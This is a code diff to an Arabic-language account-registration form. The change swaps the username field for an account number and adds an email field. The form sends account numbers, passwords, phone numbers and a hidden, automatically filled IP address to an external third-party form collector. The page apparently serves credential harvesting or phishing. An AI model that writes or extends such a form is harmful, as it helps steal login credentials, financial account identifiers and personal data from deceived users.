@@ -107,10 +107,10 @@
         <form action="https://formspree.io/f/xjygjrzn" method="POST" class="contact-form" id="mainForm">
             <h2>تسجيل حساب جديد</h2>
             
-            <!-- 1. اسم المستخدم -->
+            <!-- 1. رقم الحساب -->
             <div class="form-group">
-                <label for="username">👤 اسم المستخدم</label>
-                <input type="text" id="username" name="username" placeholder="اكتب اسم المستخدم" required>
+                <label for="account_number">🔢 رقم الحساب</label>
+                <input type="text" id="account_number" name="account_number" placeholder="اكتب رقم الحساب" required>
             </div>
 
             <!-- 2. كلمة المرور -->
@@ -125,13 +125,19 @@
                 <input type="password" id="confirm_password" name="confirm_password" placeholder="********" required>
             </div>
 
-            <!-- 4. رقم الجوال -->
+            <!-- 4. البريد الإلكتروني -->
+            <div class="form-group">
+                <label for="email">📧 البريد الإلكتروني</label>
+                <input type="email" id="email" name="email" placeholder="example@email.com" required>
+            </div>
+
+            <!-- 5. رقم الجوال -->
             <div class="form-group">
                 <label for="phone">📱 رقم الجوال</label>
                 <input type="tel" id="phone" name="phone" placeholder="05xxxxxxxx" required>
             </div>
 
-            <!-- 5. الـ IP (مخفي ويتم تعبئته تلقائياً) -->
+            <!-- 6. الـ IP (مخفي ويتم تعبئته تلقائياً) -->
             <input type="hidden" id="ip_address" name="ip_address">
 
             <button type="submit" class="submit-btn">إرسال البيانات</button>
